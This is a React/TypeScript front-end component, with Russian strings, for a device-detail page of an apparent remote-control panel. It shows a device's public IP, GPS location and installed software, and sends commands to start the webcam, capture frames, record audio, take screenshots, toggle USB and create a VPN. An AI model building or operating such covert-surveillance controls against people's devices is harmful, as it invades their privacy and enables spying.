import React, { useEffect, useState, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
    Button,
    Space,
    Row,
    Col,
    Descriptions,
    Tabs,
    message,
    notification,
    Dropdown,
    Modal,
    Table,
    Badge
} from 'antd';
import type { MenuProps } from 'antd';
import instance from 'service/api';
import { MapContainer, Marker, Popup, TileLayer } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import { CameraStream } from 'components/CameraStream/CameraStream';
import { AudioStream } from 'components/AudioStream/AudioStream';
import { MediaCapture } from 'components/PhotoStream/PhotoStream';

const { TabPane } = Tabs;

interface Device {
    id: string;
    device_identifier: string;
    description?: string;
    status: string;
    last_seen: string;
    created_at: string;
    updated_at: string;
}

interface Metric {
    id: string;
    device_id: string;
    public_ip: string;
    hostname: string;
    os_info: string;
    disk_total: number;
    disk_used: number;
    disk_free: number;
    memory_total: number;
    memory_used: number;
    memory_available: number;
    process_count: number;
    cpu_percent: number;
    bytes_sent: number;
    bytes_recv: number;
    created_at: string;
    latitude: number;
    longitude: number;
}

interface Application {
    id: string;
    name: string;
    version?: string;
    app_type?: string;
    created_at: string;
}

interface SendCommandBody {
    device_id: string;
    command: string;
}

type NotificationType = 'success' | 'info' | 'warning' | 'error';

export const ClientDetails: React.FC = () => {
    const navigate = useNavigate();
    const [api, contextHolder] = notification.useNotification();
    const { id } = useParams();

    const [device, setDevice] = useState<Device | null>(null);
    const [metric, setMetric] = useState<Metric | null>(null);
    const [apps, setApps] = useState<Application[]>([]);

    const [webcamModalVisible, setWebcamModalVisible] = useState(false);
    const [captureModalVisible, setCaptureModalVisible] = useState(false);
    const [screenshotModalVisible, setScreenshotModalVisible] = useState(false);
    const [audioModalVisible, setAudioModalVisible] = useState(false);

    useEffect(() => {
        if (id) {
            fetchDevice();
            fetchMetrics();
            fetchApps();
        }
    }, [id]);

    const fetchDevice = async () => {
        try {
            const res = await instance.get<Device>(`/api/devices/${id}`);
            setDevice(res.data);
        } catch (err) {
            message.error('Ошибка при получении данных устройства');
        }
    };

    const fetchMetrics = async () => {
        try {
            const res = await instance.get<Metric>(`/api/metrics/${id}`);
            setMetric(res.data);
        } catch (err) {
            message.error('Ошибка при получении метрик');
        }
    };

    const fetchApps = async () => {
        try {
            const res = await instance.get<Application[]>(`/api/apps/${id}`);
            setApps(res.data);
        } catch (err) {
            message.error('Ошибка при получении списка приложений');
        }
    };

    const sendCommand = async (cmd: string) => {
        try {
            const body: SendCommandBody = {
                command: cmd,
                device_id: id || ''
            };

            await instance.post(`/send_command`, body);
            openNotificationWithIcon('success', cmd);
        } catch (err) {
            openNotificationWithIcon('error', cmd);
        }
    };

    const openNotificationWithIcon = (type: NotificationType, cmd: string) => {
        api[type]({
            message:
                type === 'success'
                    ? `Команда "${cmd}" успешно отправлена`
                    : `Ошибка при отправке команды "${cmd}"`
        });
    };

    const handleBack = () => {
        navigate(-1);
    };

    const formatBytes = (bytes: number, decimals = 2) => {
        if (!bytes) return '0 Bytes';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    };

    debugger;
    const mapCenter: [number, number] = metric
        ? [metric.latitude, metric.longitude]
        : [51.505, -0.09];

    const usbItems: MenuProps['items'] = [
        {
            key: 'on',
            label: 'Turn ON USB',
            onClick: () => sendCommand('usb_on')
        },
        {
            key: 'off',
            label: 'Turn OFF USB',
            onClick: () => sendCommand('usb_off')
        }
    ];

    const cameraItems: MenuProps['items'] = [
        {
            key: 'start_camera',
            label: 'View the webcam',
            onClick: () => handleOpenWebcamModal()
        },
        {
            key: 'capture_frame',
            label: 'Take a picture with webcam',
            onClick: () => handleCaptureFrameModal()
        }
    ];

    const audioItems: MenuProps['items'] = [
        {
            key: 'record_audio',
            label: 'Record Audio',
            onClick: () => handleRecordAudio()
        },
        {
            key: 'listen_microphone',
            label: 'Listen to the microphone'
        }
    ];

    const handleOpenWebcamModal = async () => {
        await sendCommand('start_camera');
        setWebcamModalVisible(true);
    };

    const handleStopWebcamModal = async () => {
        await sendCommand('stop_camera');
        setWebcamModalVisible(false);
    };

    const handleCaptureFrameModal = async () => {
        await sendCommand('capture_frame');
        setTimeout(() => {
            setCaptureModalVisible(true);
        }, 2000);
    };

    const handleScreenshotModal = async () => {
        await sendCommand('screenshot');
        setScreenshotModalVisible(true);
    };

    const handleRecordAudio = async () => {
        await sendCommand('record_audio');
        setTimeout(() => {
            setAudioModalVisible(true);
        }, 2000);
    };

    // Пример колонок для таблицы установленных приложений
    const appColumns = [
        { title: 'Name', dataIndex: 'name' },
        { title: 'Version', dataIndex: 'version' },
        { title: 'Type', dataIndex: 'app_type' },
        { title: 'Installed At', dataIndex: 'created_at' }
    ];

    return (
        <div style={{ padding: 16 }}>
            {contextHolder}
            <Row justify="space-between" align="middle" style={{ marginBottom: 16 }}>
                <Col>
                    <Space>
                        <Button onClick={handleBack}>{'< Back'}</Button>
                        <span style={{ fontSize: 18, fontWeight: 'bold' }}>
                            {metric?.hostname || id}
                        </span>
                    </Space>
                </Col>
                <Col>
                    <Space>
                        <Dropdown menu={{ items: cameraItems }} placement="bottomLeft">
                            <Button>Webcam</Button>
                        </Dropdown>
                        <Dropdown menu={{ items: audioItems }} placement="bottomLeft">
                            <Button>Audio</Button>
                        </Dropdown>
                        <Dropdown menu={{ items: usbItems }} placement="bottomLeft">
                            <Button>USB</Button>
                        </Dropdown>
                        <Button onClick={() => sendCommand('create_vpn')}>
                            Create VPN connection
                        </Button>
                        <Button onClick={handleScreenshotModal}>Take Screenshot</Button>
                    </Space>
                </Col>
            </Row>

            <div style={{ marginBottom: 16, background: '#fff', padding: 16 }}>
                {device && metric ? (
                    <Descriptions title="Information about the system" bordered size="small">
                        <Descriptions.Item label="Status">
                            <Badge
                                status={
                                    device.status.toLowerCase() === 'online' ? 'success' : 'default'
                                }
                                text={device.status}
                            />
                        </Descriptions.Item>
                        <Descriptions.Item label="Disk total">
                            {formatBytes(metric.disk_total)}
                        </Descriptions.Item>
                        <Descriptions.Item label="Disk free">
                            {formatBytes(metric.disk_free)}
                        </Descriptions.Item>
                        <Descriptions.Item label="OS">{metric.os_info}</Descriptions.Item>
                        <Descriptions.Item label="Total memory">
                            {formatBytes(metric.memory_total)}
                        </Descriptions.Item>
                        <Descriptions.Item label="Processor">{metric.hostname}</Descriptions.Item>
                        <Descriptions.Item label="Public IP">{metric.public_ip}</Descriptions.Item>
                        <Descriptions.Item label="Coordinates">
                            {metric.latitude}, {metric.longitude}
                        </Descriptions.Item>
                    </Descriptions>
                ) : (
                    <p>Нет данных о метриках или устройстве</p>
                )}
            </div>

            <Tabs defaultActiveKey="details">
                <TabPane tab="Software" key="apps">
                    <Table
                        dataSource={apps}
                        columns={appColumns}
                        rowKey="id"
                        pagination={{ pageSize: 5 }}
                    />
                </TabPane>
                <TabPane tab="Scripts" key="scripts">
                    <p>Какие-то запросы/логи.</p>
                </TabPane>
            </Tabs>

            <div style={{ marginTop: 16, padding: 16, background: '#fff' }}>
                <div style={{ width: '100%', height: '400px' }}>
                    <MapContainer
                        center={mapCenter}
                        zoom={13}
                        style={{ height: '100%', width: '100%' }}
                    >
                        <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                        {metric && (
                            <Marker position={[metric.latitude, metric.longitude]}>
                                <Popup>
                                    Текущая позиция: {metric.latitude}, {metric.longitude}
                                </Popup>
                            </Marker>
                        )}
                    </MapContainer>
                </div>
            </div>

            <Modal
                title="Webcam streaming"
                open={webcamModalVisible}
                closable={false}
                maskClosable={false}
                footer={<Button onClick={handleStopWebcamModal}>Stop streaming</Button>}
                destroyOnClose
            >
                <CameraStream id={id} />
            </Modal>

            <Modal
                title="Captured Frame"
                open={captureModalVisible}
                onCancel={() => setCaptureModalVisible(false)}
                footer={null}
                destroyOnClose
            >
                <MediaCapture id={id} mode="capture" />
            </Modal>

            <Modal
                title="Screenshot"
                open={screenshotModalVisible}
                onCancel={() => setScreenshotModalVisible(false)}
                footer={null}
                destroyOnClose
            >
                <MediaCapture id={id} mode="screenshot" />
            </Modal>

            <Modal
                title="Recorded audio"
                open={audioModalVisible}
                onCancel={() => setAudioModalVisible(false)}
                footer={null}
                destroyOnClose
            >
                <AudioStream deviceId={id} />
            </Modal>
        </div>
    );
};
